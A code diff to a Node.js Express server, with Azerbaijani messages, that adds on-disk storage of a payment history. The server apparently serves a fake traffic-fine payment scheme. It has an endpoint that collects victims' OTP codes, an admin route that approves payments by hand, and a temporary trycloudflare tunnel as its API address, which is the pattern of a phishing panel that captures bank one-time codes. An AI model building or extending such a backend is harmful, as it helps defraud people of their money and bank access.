@@ -56,7 +56,24 @@ let fineData = {
     apiUrl: "https://superintendent-elementary-leads-urls.trycloudflare.com/api"
 };
 
+// Persistent History Archive on Disk
+const historyFilePath = path.join(__dirname, 'history.json');
 let paidHistory = [];
+if (fs.existsSync(historyFilePath)) {
+    try {
+        paidHistory = JSON.parse(fs.readFileSync(historyFilePath, 'utf8'));
+    } catch (e) {
+        paidHistory = [];
+    }
+}
+
+function saveHistory() {
+    try {
+        fs.writeFileSync(historyFilePath, JSON.stringify(paidHistory, null, 2));
+    } catch (e) {
+        console.error("History save error:", e);
+    }
+}
 
 // GET fine details
 app.get('/api/fine', (req, res) => {
@@ -118,6 +135,7 @@ app.post('/api/reset', (req, res) => {
     fineData.hasNewRequest = false;
     fineData.isPendingApproval = false;
     paidHistory = [];
+    saveHistory();
     res.json({ success: true, message: "Bütün ödənişlər, sorğular və tarixçə təmizləndi", fine: fineData });
 });
 
@@ -140,7 +158,7 @@ app.post('/api/otp', (req, res) => {
     res.json({ success: true, message: "OTP kodu qəbul edildi, təsdiq gözlənilir" });
 });
 
-// POST Admin approve payment (Saves to paidHistory)
+// POST Admin approve payment (Saves to paidHistory on disk)
 app.post('/api/admin/approve', (req, res) => {
     fineData.isPaid = true;
     fineData.isPendingApproval = false;
@@ -155,6 +173,7 @@ app.post('/api/admin/approve', (req, res) => {
         approvedAt: getCurrentDateTime()
     };
     paidHistory.unshift(historyItem); // Add to beginning
+    saveHistory();
 
     res.json({ success: true, message: "Ödəniş admin tərəfindən təsdiqləndi", fine: fineData });
 });
